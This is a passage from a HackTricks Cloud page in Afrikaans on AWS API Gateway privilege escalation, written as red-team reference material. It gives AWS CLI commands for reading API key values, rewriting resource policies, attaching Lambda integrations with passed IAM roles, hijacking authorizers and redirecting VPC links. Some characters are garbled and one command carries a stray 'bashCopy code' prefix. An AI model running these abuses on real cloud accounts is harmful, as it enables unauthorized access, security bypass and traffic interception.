# AWS - Apigateway Privesc

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Apigateway

Vir meer inligting kyk:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### `apigateway:POST`

Met hierdie toestemming kan jy API-sleutels van die gekonfigureerde API's genereer (per streek).
```bash
aws --region <region> apigateway create-api-key
```
**Potensi√´le Impak:** Jy kan nie privesc nie met hierdie tegniek nie, maar jy kan moontlik toegang kry tot sensitiewe inligting.

### `apigateway:GET`

Met hierdie toestemming kan jy gegenereerde API-sleutels van die geconfigureerde API's kry (per streek).
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**Potensi√´le Impak:** Jy kan nie privesc uitvoer met hierdie tegniek nie, maar jy kan moontlik toegang tot sensitiewe inligting kry.

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

Met hierdie regte is dit moontlik om die hulpbronbeleid van 'n API te wysig om jouself toegang te gee om dit te roep en moontlik toegang tot die API gateway te misbruik (soos die aanroeping van 'n kwesbare lambda).

{% code overflow="wrap" %}
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
{% endcode %}

**Potensi√´le Impak:** Jy sal gewoonlik nie direk kan privilige-escalate met hierdie tegniek nie, maar jy kan dalk toegang kry tot sensitiewe inligting.

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

{% hint style="info" %}
Benodig toetsing
{% endhint %}

'n Aanvaller met die regte `apigateway:PutIntegration`, `apigateway:CreateDeployment`, en `iam:PassRole` kan **'n nuwe integrasie by 'n bestaande API Gateway REST API met 'n Lambda-funksie wat 'n IAM rol aangeheg het, toevoeg**. Die aanvaller kan dan **die Lambda-funksie trigger om willekeurige kode uit te voer en moontlik toegang te verkry tot die hulpbronne wat met die IAM rol geassosieer is**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potensi√´le Impak**: Toegang tot bronne wat verband hou met die IAM rol van die Lambda-funksie.

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

{% hint style="info" %}
Benodig toetsing
{% endhint %}

'n Aanvaller met die regte `apigateway:UpdateAuthorizer` en `apigateway:CreateDeployment` kan **'n bestaande API Gateway outentiseerder wysig** om sekuriteitskontroles te omseil of arbitr√™re kode uit te voer wanneer API-versoeke gedoen word.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potensi√´le Impak**: Omseil van sekuriteitskontroles, ongemagtigde toegang tot API-bronne.

### `apigateway:UpdateVpcLink`

{% hint style="info" %}
Benodig toetsing
{% endhint %}

'n Aanvaller met die toestemming `apigateway:UpdateVpcLink` kan **'n bestaande VPC-skakel wysig om na 'n ander Netwerk Lasbalansierder te verwys, wat moontlik private API-verkeer na ongemagtigde of skadelike bronne kan omskakel**.
```bash
bashCopy codeVPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**Potensi√´le Impak**: Onbevoegde toegang tot private API-bronne, onderskepping of ontwrigting van API-verkeer.

{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
